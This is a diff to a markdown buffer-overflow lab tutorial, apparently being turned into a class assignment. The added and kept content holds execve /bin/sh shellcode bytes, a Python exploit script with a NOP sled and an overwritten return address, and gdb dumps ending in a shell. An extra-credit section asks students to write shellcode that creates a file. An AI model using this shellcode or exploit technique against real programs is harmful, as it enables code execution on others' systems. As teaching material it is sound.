@@ -234,6 +234,8 @@ Now let's overwrite every register following our buffer, `ebx` with
 
 Program received signal SIGSEGV, Segmentation fault.
 0x44444444 in ?? ()
+```
+```bash
 (gdb) info registers
 [...]
 ebx            0x42424242          1111638594
@@ -243,6 +245,9 @@ esi            0x804b0e0           134525152
 edi            0xf7ffcb80          -134231168
 eip            0x44444444          0x44444444
 [...]
+```
+
+```bash
 (gdb) (gdb) x/14x $sp+460
 0xffffcfbc:     0x41414141      0x41414141      0x41414141      0x41414141
 0xffffcfcc:     0x41414141      0x41414141      0x41414141      0x41414141
@@ -288,8 +293,7 @@ compromised machine.
 
 In our case, we will inject a shellcode into our buffer in order to have
 it get executed later on.\
-[Wikipedia](https://en.wikipedia.org/wiki/Shellcode){target="_blank"
-rel="noopener"} defines the writing of shellcode "as much of an art as
+[Wikipedia](https://en.wikipedia.org/wiki/Shellcode) defines the writing of shellcode "as much of an art as
 it is a science", since shellcode depends on the operating system, CPU
 architecture and is commonly written in Assembly.
 
@@ -348,6 +352,10 @@ with some bash-fu:
 
 ```bash
 objdump -d ./shellcode.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+```
+
+Ooutput:
+```
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 ```
 
@@ -427,6 +435,8 @@ it's important to use `bytes` type.
 In addition, since we are working on x86, the hexadecimal value for NOP
 instructions is `0x90`.
 
+Save the following as exploit.py
+
 ```bash
 import sys
 
@@ -475,16 +485,24 @@ to define what the return address should be.
 When inspecting the memory, we can see our payload was injected as
 expected:
 
+```bash
+(gdb) x/16x $sp+430
+0xffffcfee:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffcffe:	0x50c03190	0x732f6e68	0x2f2f6868	0xe3896962
+0xffffd00e:	0x53e28950	0x0bb0e189	0x434380cd	0x43434343
+0xffffd01e:	0x43434343	0x43434343	0x43434343	0x43434343
+```
+
 ![buffer overflow memory
 inspection](https://github.com/hg8/hg8.github.io/assets/9076747/a8b81bb7-2590-47e9-bc15-c2071f7d7f03)
 
 Let's now pick any memory address within the `x90` NOP sled area before
 the shellcode to be our return address. From the screenshot above we can
-pick `0xffffce30` for example.
+pick `0xffffcfee` for example.
+
 
 Since Intel CPUs are [little
-endian](https://en.wikipedia.org/wiki/Endianness){target="_blank"
-rel="noopener"}, we need to reverse the address for our payload.
+endian](https://en.wikipedia.org/wiki/Endianness), we need to reverse the address for our payload.
 
 Our script becomes:
 
@@ -492,12 +510,14 @@ Our script becomes:
 import sys
 
 shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
-eip = b"\x30\xce\xff\xff" * 10
+eip = b"\xee\xcf\xff\xff" * 10
 nop = b"\x90" * 447
 buff = nop + shellcode + eip
 
 sys.stdout.buffer.write(buff) 
 ```
+
+Note:  Pay close attention to the order of the bytes!!
 
 If everything goes fine, our program `strcpy` will copy our string, and
 when it will try to return it will load our injected return value,
@@ -515,10 +535,20 @@ process 6722 is executing new program: /usr/bin/bash
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/usr/lib/libthread_db.so.1".
 sh-5.1$
-```
-
 And here we go! The buffer overflow was successfully exploited,
 resulting in obtaining access to a command shell.
+
+
+# Extra Credit
+
+Modiy your shell code to create a file in the executable's directory called evil.txt
+Take a screen shot of the directory after it is run and hand in the source to your shellcode as a shellcode_evil.asm
+
+You can (and are encouraged to) use AI to help generate the shellcode.
+
+
+#What to hand in
+
 
 
 # Clean Up
